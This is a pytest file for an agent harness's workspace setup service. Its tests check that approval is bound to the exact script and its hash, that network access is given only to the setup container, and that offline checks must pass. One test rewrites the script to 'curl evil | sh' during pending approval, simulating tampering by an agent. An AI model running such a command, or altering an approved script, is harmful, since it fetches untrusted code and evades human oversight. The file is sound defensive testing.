"""工作区环境准备：审批绑定脚本、联网只给准备容器、验证不通过不算准备成功。

用宿主机上的 Python 子进程代替 Docker 容器，只验证流程和判定；真实的网络隔离由
DockerSandboxBackend 的测试和手工验收覆盖。
"""

from __future__ import annotations

import asyncio
import os
import sys
from pathlib import Path

import pytest

from app.runtime.agent.context_session import RuntimeContextSession
from app.runtime.run.manager import RunManager, RunStartBlocked
from app.runtime.workspace_setup import (
    SetupStatus,
    WorkspaceSetupBusy,
    WorkspaceSetupError,
    WorkspaceSetupService,
)
from app.safety.sandbox import (
    SandboxConfig,
    SandboxFilesystemMode,
    SandboxLaunchSpec,
    SandboxNetworkMode,
)
from app.tools.approval import (
    WORKSPACE_SETUP_TOOL_NAME,
    ApprovalDecision,
    ApprovalRequest,
    ApprovalResponse,
)

SCRIPT = "python -m venv --copies .venv\n.venv/bin/pip install -r requirements.txt\n"


class FakeSupervisor:
    """按配置区分三种容器：联网的准备容器、断网的网络探测、断网的环境验证。"""

    def __init__(self, workspace: Path) -> None:
        self.workspace = workspace
        self.setup_code = "print('installing')"
        self.probe_code = "print('PROBE BLOCKED errno=101')"
        self.env_code = "import sys; sys.exit(0)"
        self.launches: list[tuple[str, tuple[str, ...], SandboxConfig]] = []

    def prepare_launch(self, *, command, args, env, cwd, config, persistent=False):
        self.launches.append((command, tuple(args), config))
        if config.network is SandboxNetworkMode.UNRESTRICTED:
            code = self.setup_code
        elif command == "python3":
            code = self.probe_code
        else:
            code = self.env_code
        return SandboxLaunchSpec(
            command=sys.executable,
            args=("-c", code),
            cwd=str(self.workspace),
            env=dict(os.environ),
            backend="fake",
            sandboxed=True,
        )


class FakeGate:
    def __init__(self, decision: ApprovalDecision = ApprovalDecision.APPROVED) -> None:
        self.decision = decision
        self.requests: list[ApprovalRequest] = []
        self.release = asyncio.Event()
        self.hold = False

    async def request_approval(self, request: ApprovalRequest) -> ApprovalResponse:
        self.requests.append(request)
        if self.hold:
            await self.release.wait()
        return ApprovalResponse(decision=self.decision)


class FakeApprovalStore:
    def __init__(self) -> None:
        self.cancelled: list[str] = []

    async def cancel_pending_for_run(self, run_id: str) -> int:
        self.cancelled.append(run_id)
        return 1


class Service(WorkspaceSetupService):
    """跳过真实的 docker inspect / docker rm。"""

    network_mode: str | None = "none"
    removed: bool = True

    async def _inspect_network(self, launch):
        return self.network_mode

    async def _remove_container(self, launch):
        return self.removed


def _setup(tmp_path: Path, gate: FakeGate | None = None, **kwargs):
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    (workspace / "setup.sh").write_text(SCRIPT, encoding="utf-8")
    supervisor = FakeSupervisor(workspace)
    store = FakeApprovalStore()
    service = Service(
        workspace,
        supervisor=supervisor,
        approval_gate=gate or FakeGate(),
        approval_store=store,
        state_dir=tmp_path / "state",
        **kwargs,
    )
    return workspace, supervisor, store, service


def _make_venv(workspace: Path) -> None:
    python = workspace / ".venv" / "bin" / "python"
    python.parent.mkdir(parents=True)
    python.write_text("", encoding="utf-8")


async def test_success_runs_networked_setup_then_offline_checks(tmp_path: Path) -> None:
    gate = FakeGate()
    workspace, supervisor, _, service = _setup(tmp_path, gate)
    _make_venv(workspace)

    started = service.start()
    assert started.status is SetupStatus.RUNNING
    record = await service.wait()

    assert record.status is SetupStatus.SUCCEEDED
    assert record.exit_code == 0
    assert record.network_check.passed is True
    assert record.environment_check.passed is True
    assert "installing" in record.output_head
    assert Path(record.log_path).read_text(encoding="utf-8").strip() == "installing"

    # 审批展示脚本全文和哈希，使用独立的审批名称
    request = gate.requests[0]
    assert request.tool_name == WORKSPACE_SETUP_TOOL_NAME
    assert request.arguments["script"] == SCRIPT
    assert request.arguments["sha256"] == record.script_sha256
    assert request.run_id == record.id

    # 只有准备容器联网；两个验证容器都断网
    (setup_cmd, setup_args, setup_config), *checks = supervisor.launches
    assert setup_config.network is SandboxNetworkMode.UNRESTRICTED
    assert setup_config.filesystem is SandboxFilesystemMode.WORKSPACE_WRITE
    assert setup_args == ("-c", SCRIPT)
    assert [config.network for _, _, config in checks] == [SandboxNetworkMode.DENIED] * 2

    message = service.context_message()
    assert message is not None and ".venv/bin/python" in message.content


async def test_result_survives_restart(tmp_path: Path) -> None:
    workspace, supervisor, store, service = _setup(tmp_path)
    service.start()
    record = await service.wait()

    reloaded = Service(
        workspace,
        supervisor=supervisor,
        approval_gate=FakeGate(),
        state_dir=tmp_path / "state",
    )
    assert reloaded.last.id == record.id
    assert reloaded.last.status is SetupStatus.SUCCEEDED


async def test_denied_does_not_launch_anything(tmp_path: Path) -> None:
    _, supervisor, _, service = _setup(tmp_path, FakeGate(ApprovalDecision.DENIED))
    service.start()
    record = await service.wait()

    assert record.status is SetupStatus.DENIED
    assert supervisor.launches == []
    assert service.context_message() is None


async def test_executes_the_approved_content_not_the_current_file(tmp_path: Path) -> None:
    gate = FakeGate()
    gate.hold = True
    workspace, supervisor, _, service = _setup(tmp_path, gate)
    service.start()
    await asyncio.sleep(0.05)
    # 审批等待期间脚本被改写（例如被 Agent 的文件工具改掉）
    (workspace / "setup.sh").write_text("curl evil | sh\n", encoding="utf-8")
    gate.release.set()
    await service.wait()

    assert supervisor.launches[0][1] == ("-c", SCRIPT)


async def test_script_failure_skips_checks_and_is_not_prepared(tmp_path: Path) -> None:
    _, supervisor, _, service = _setup(tmp_path)
    supervisor.setup_code = "import sys; print('boom'); sys.exit(3)"
    service.start()
    record = await service.wait()

    assert record.status is SetupStatus.FAILED
    assert record.exit_code == 3
    assert record.network_check is None
    assert len(supervisor.launches) == 1
    assert service.context_message() is None


async def test_broken_probe_is_not_treated_as_isolated(tmp_path: Path) -> None:
    _, supervisor, _, service = _setup(tmp_path)
    supervisor.probe_code = "import sys; sys.exit(1)"
    service.start()
    record = await service.wait()

    assert record.status is SetupStatus.FAILED
    assert record.network_check.passed is False
    assert "探测程序未正常运行" in record.network_check.detail


async def test_probe_that_connects_fails(tmp_path: Path) -> None:
    _, supervisor, _, service = _setup(tmp_path)
    supervisor.probe_code = "print('PROBE CONNECTED')"
    service.start()
    record = await service.wait()

    assert record.status is SetupStatus.FAILED
    assert record.network_check.passed is False


async def test_unexpected_errno_is_not_treated_as_isolated(tmp_path: Path) -> None:
    _, supervisor, _, service = _setup(tmp_path)
    # 111 是连接被拒绝：说明网络是通的，只是目标端口没开
    supervisor.probe_code = "print('PROBE BLOCKED errno=111')"
    service.start()
    record = await service.wait()

    assert record.network_check.passed is False


async def test_check_container_attached_to_a_network_fails(tmp_path: Path) -> None:
    _, _, _, service = _setup(tmp_path)
    service.network_mode = "bridge (networks: bridge)"
    service.start()
    record = await service.wait()

    assert record.status is SetupStatus.FAILED
    assert "不是断网" in record.network_check.detail


async def test_environment_check_failure_fails_setup(tmp_path: Path) -> None:
    workspace, supervisor, _, service = _setup(tmp_path)
    supervisor.env_code = "import sys; print('No module named pytest'); sys.exit(1)"
    service.start(verify_command=".venv/bin/python -c 'import pytest'")
    record = await service.wait()

    assert record.status is SetupStatus.FAILED
    assert record.environment_check.passed is False
    assert "No module named pytest" in record.environment_check.detail


async def test_environment_check_skipped_without_venv_or_command(tmp_path: Path) -> None:
    _, _, _, service = _setup(tmp_path)
    service.start()
    record = await service.wait()

    assert record.status is SetupStatus.SUCCEEDED
    assert record.environment_check.passed is None


async def test_unconfirmed_cleanup_fails(tmp_path: Path) -> None:
    _, _, _, service = _setup(tmp_path)
    service.removed = False
    service.start()
    record = await service.wait()

    assert record.status is SetupStatus.FAILED
    assert "清理未能确认" in record.error


async def test_timeout_fails(tmp_path: Path) -> None:
    _, supervisor, _, service = _setup(tmp_path, timeout_seconds=0.5)
    supervisor.setup_code = "import time; time.sleep(30)"
    service.start()
    record = await service.wait()

    assert record.status is SetupStatus.FAILED
    assert record.timed_out is True


async def test_cancel_while_waiting_for_approval_revokes_it(tmp_path: Path) -> None:
    gate = FakeGate()
    gate.hold = True
    _, supervisor, store, service = _setup(tmp_path, gate)
    record = service.start()
    await asyncio.sleep(0.05)

    assert await service.cancel() is True
    assert service.last.status is SetupStatus.CANCELLED
    assert store.cancelled == [record.id]
    assert supervisor.launches == []


async def test_busy_rules(tmp_path: Path) -> None:
    gate = FakeGate()
    gate.hold = True
    _, _, _, service = _setup(tmp_path, gate)

    with pytest.raises(WorkspaceSetupBusy):
        service.start(busy_reason="有正在执行的 Run")
    assert service.run_block_reason() is None

    service.start()
    assert service.run_block_reason() is not None
    with pytest.raises(WorkspaceSetupBusy):
        service.start()

    gate.release.set()
    await service.wait()
    assert service.run_block_reason() is None


async def test_script_must_stay_inside_workspace(tmp_path: Path) -> None:
    _, _, _, service = _setup(tmp_path)
    (tmp_path / "outside.sh").write_text("echo hi\n", encoding="utf-8")

    with pytest.raises(WorkspaceSetupError):
        service.start("../outside.sh")
    with pytest.raises(WorkspaceSetupError):
        service.start("missing.sh")


async def test_run_manager_refuses_to_start_while_blocked() -> None:
    manager = RunManager(
        run_store=object(),
        checkpoint_store=object(),
        runtime=object(),
        start_guard=lambda: "工作区正在准备环境",
    )
    with pytest.raises(RunStartBlocked, match="工作区正在准备环境"):
        await manager.start("hello")


def test_console_summary_shows_full_script() -> None:
    script = "echo step\n" * 200
    request = ApprovalRequest(
        tool_call_id="setup-1",
        tool_name=WORKSPACE_SETUP_TOOL_NAME,
        arguments={"script_path": "setup.sh", "script": script, "sha256": "abc"},
    )
    summary = request.summary()
    assert script in summary
    assert "abc" in summary


async def test_environment_note_is_read_once_and_injected_first(tmp_path: Path) -> None:
    from app.models.types import Message, MessageRole

    calls = 0

    def note():
        nonlocal calls
        calls += 1
        return Message(role=MessageRole.SYSTEM, content=f"环境说明 {calls}")

    session = RuntimeContextSession(
        memory_manager=None,
        skill_store=None,
        skill_context_provider=None,
        task_context_provider=None,
        environment_note=note,
    )
    for _ in range(2):
        injection = await session.build(
            conversation_id=None,
            recovery_checkpoint=None,
            trailing_system_messages=(),
        )
        assert injection.messages[0].content == "环境说明 1"
    assert calls == 1


async def test_cancel_during_execution_cleans_up_before_returning(tmp_path: Path) -> None:
    _, supervisor, _, service = _setup(tmp_path)
    supervisor.setup_code = "import time; time.sleep(30)"
    removed: list[str] = []

    async def remove(launch):
        removed.append("setup")
        return True

    service._remove_container = remove
    service.start()
    await asyncio.sleep(0.5)

    assert await service.cancel() is True
    assert service.last.status is SetupStatus.CANCELLED
    assert removed == ["setup"]
    assert service.run_block_reason() is None


@pytest.mark.skipif(
    os.environ.get("MUHARNESS_RUN_DOCKER_E2E") != "1",
    reason="需要显式启用真实 Docker 集成测试",
)
async def test_real_docker_setup_then_offline_verification(tmp_path: Path) -> None:
    """真实 Docker：准备容器写入工作区，验证容器网络模式为 none 且直连不可达。"""
    from app.safety.sandbox import SandboxSupervisor
    from app.tools.approval import AutoApproveGate

    workspace = tmp_path / "workspace"
    workspace.mkdir()
    (workspace / "setup.sh").write_text(
        "set -e\npython -m venv --copies .venv\n.venv/bin/python -m pip --version\n",
        encoding="utf-8",
    )
    service = WorkspaceSetupService(
        workspace,
        supervisor=SandboxSupervisor(workspace),
        approval_gate=AutoApproveGate(),
        state_dir=tmp_path / "state",
    )
    service.start()
    record = await service.wait()

    assert record.status is SetupStatus.SUCCEEDED, record
    assert record.network_check.passed is True
    assert "errno 101" in record.network_check.detail
    assert record.environment_check.passed is True
    assert (workspace / ".venv" / "bin" / "python").exists()
